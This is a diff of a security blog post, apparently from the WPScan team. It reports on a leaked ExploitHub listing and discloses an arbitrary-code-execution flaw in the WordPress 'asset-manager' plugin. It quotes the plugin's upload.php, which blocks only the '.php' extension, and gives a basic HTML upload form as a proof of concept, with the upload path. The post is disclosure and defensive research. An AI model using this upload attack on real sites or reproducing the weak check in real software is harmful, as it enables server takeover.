@@ -67,76 +67,62 @@
 
         <section class="post-content">
             <p>The '<a href="http://1337day.com/" target="_blank">Inj3ct0r Team</a>' compromised an <a href="https://www.exploithub.com/" target="_blank">ExploitHub.com</a> database and released a <a href="http://priv8.1337day.com/exploitHUB.txt" target="_blank">file</a> publicly which contained some of the data about the exploits that ExploitHub buy and sell.</p>
-
 <p>I saw the file yesterday, had a quick skim over it, but didn't think too much of it. That is until WPScan team member <a href="https://www.twitter.com/@gbrindisi" target="_blank">@gbrindisi</a> pointed out that it contained 2 WordPress plugin vulnerabilities.</p>
-
 <p>
   
-<div class="highlight"><pre><code class="language-text" data-lang="text">WordPress plugin Asset manager upload.php Arbitrary Code Execution,25.0000,2012-06-27 12:37:03,&quot;491&quot;,Sooraj
-WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012-06-27 12:44:25,&quot;491&quot;,Sooraj</code></pre></div>
+<figure class="highlight"><pre><code class="language-text" data-lang="text">  WordPress plugin Asset manager upload.php Arbitrary Code Execution,25.0000,2012-06-27 12:37:03,"491",Sooraj
+WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012-06-27 12:44:25,"491",Sooraj</code></pre></figure>
 </p>
-
 <p>The vulnerability details and exploits are likely in the hands of the Inj3ct0r Team and god knows who else. We found the latest 'asset-manager' plugin (version 0.3) to be vulnerable and created a simple PoC. The 'wp-property' plugin did not contain the 'uploadify.php' file which is stated to be vulnerable, did they buy/sell vulnerabilities that hadn't been verified? The 'asset-manager' plugin is not as popular as the 'wp-property' plugin and has only been downloaded <a href="http://wordpress.org/extend/plugins/asset-manager/stats/" target="_blank">~700</a> times.</p>
-
 <p>The 'asset-manager' vulnerability title states that the vulnerability lies within the 'upload.php' file. Taking a look at this file it is obvious to see why it is vulnerable.</p>
-
 <p><a id="more"></a><a id="more-16915"></a></p>
-
 <p>
   
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="sd">/**</span>
-<span class="sd"> * Upload file to temp directory and return image information in JSON format.</span>
-<span class="sd"> */</span>
-<span class="k">require</span><span class="p">(</span><span class="s1">&#39;../../../wp-load.php&#39;</span><span class="p">);</span>
-<span class="k">require</span><span class="p">(</span><span class="s1">&#39;paam-config-ajax.php&#39;</span><span class="p">);</span>
+<figure class="highlight"><pre><code class="language-php" data-lang="php">  <span class="cp">&lt;?php</span>
+<span class="sd">/**
+ * Upload file to temp directory and return image information in JSON format.
+ */</span>
+<span class="k">require</span><span class="p">(</span><span class="s1">'../../../wp-load.php'</span><span class="p">);</span>
+<span class="k">require</span><span class="p">(</span><span class="s1">'paam-config-ajax.php'</span><span class="p">);</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">current_user_can</span><span class="p">(</span><span class="s1">&#39;edit_pages&#39;</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;No permission.&quot;</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">current_user_can</span><span class="p">(</span><span class="s1">'edit_pages'</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"No permission."</span><span class="p">);</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;Filedata&#39;</span><span class="p">]))</span> <span class="p">{</span>
-  <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;Filedata&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'Filedata'</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'Filedata'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
   
-  <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">'.'</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
   
-  <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">==</span> <span class="s1">&#39;php&#39;</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid file extension.&quot;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">==</span> <span class="s1">'php'</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Invalid file extension."</span><span class="p">);</span>
     
-  <span class="c1">//$unique_name = str_replace(&#39;-&#39;, &#39;&#39;, uniqid()) . &#39;.&#39; . $extension;</span>
-  <span class="c1">// not using unique names</span>
-  <span class="nv">$unique_name</span> <span class="o">=</span> <span class="nv">$file_name</span><span class="p">;</span>
-  <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;Filedata&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">PAAM_TEMPPATH</span> <span class="o">.</span> <span class="nv">$unique_name</span><span class="p">);</span>
+  <span class="c1">//$unique_name = str_replace('-', '', uniqid()) . '.' . $extension;
+</span>  <span class="c1">// not using unique names
+</span>  <span class="nv">$unique_name</span> <span class="o">=</span> <span class="nv">$file_name</span><span class="p">;</span>
+  <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'Filedata'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nx">PAAM_TEMPPATH</span> <span class="o">.</span> <span class="nv">$unique_name</span><span class="p">);</span>
   
-  <span class="k">echo</span> <span class="s1">&#39;{result: 1, name: &quot;&#39;</span> <span class="o">.</span> <span class="nv">$unique_name</span> <span class="o">.</span> <span class="s1">&#39;&quot;, path: &quot;&#39;</span> <span class="o">.</span> <span class="nx">PAAM_TEMPURL</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$unique_name</span> <span class="o">.</span> <span class="s1">&#39;&quot;}&#39;</span><span class="p">;</span>
-<span class="p">}</span></code></pre></div>
+  <span class="k">echo</span> <span class="s1">'{result: 1, name: "'</span> <span class="o">.</span> <span class="nv">$unique_name</span> <span class="o">.</span> <span class="s1">'", path: "'</span> <span class="o">.</span> <span class="nx">PAAM_TEMPURL</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$unique_name</span> <span class="o">.</span> <span class="s1">'"}'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
 </p>
-
 <p>The most important lines in this file are lines 8 and 15. Line 8 ensures that the file is only accesible to users with the 'edit_pages' permission. Line 15 checks that the file extension is not 'php', if it is, throw an error. (line 22 is likely to be vulnerable to XSS but this was not verified)</p>
-
 <p>PHP by default can interpret code in files with extensions such as 'php3'. To exploit the above issue all you have to do is trick an authenticated user with sufficient privileges to send a file with the 'php3' (or variant) extension containing malicious PHP code to the server.</p>
-
 <p>Here is a basic PoC:</p>
-
 <p>
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
 <span class="nt">&lt;body&gt;</span>
 
-<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://example.com/wp-content/plugins/asset-manager/upload.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">enctype=</span><span class="s">&quot;multipart/form-data&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://example.com/wp-content/plugins/asset-manager/upload.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
 
-  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;file&quot;</span> <span class="na">id=</span><span class="s">&quot;Filedata&quot;</span> <span class="na">name=</span><span class="s">&quot;Filedata&quot;</span> <span class="nt">/&gt;</span>
-  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">id=</span><span class="s">&quot;submit&quot;</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">id=</span><span class="s">"Filedata"</span> <span class="na">name=</span><span class="s">"Filedata"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">id=</span><span class="s">"submit"</span> <span class="nt">/&gt;</span>
 
 <span class="nt">&lt;/form&gt;</span>
 
 <span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span></code></pre></div>
+<span class="nt">&lt;/html&gt;</span></code></pre></figure>
 </p>
-
 <p>With some JavaScript trickery, the submission of the form and file can be automated. The file will be uploaded to the '/wp-content/uploads/assets/temp/' directory.</p>
-
 <p>The 'product_price' column in the Inj3ct0r leak says '25.0000', <del>what currency this is and the exact amount I don't know. It could be $25 or $25,000</del> <ins>it was $25</ins>. Either way, it shows that there is a market big or small for WordPress plugin vulnerabilities.</p>
-
 <p>This will be added to the <a href="http://wpscan.org/" target="_blank">WPScan</a> databases so don't forget to update!</p>
-
 <p>(only after doing the research and writing the blog post did I realise that it wasn't such a popular plugin, one more for the WPScan database anyway :)</p>
 
         </section>
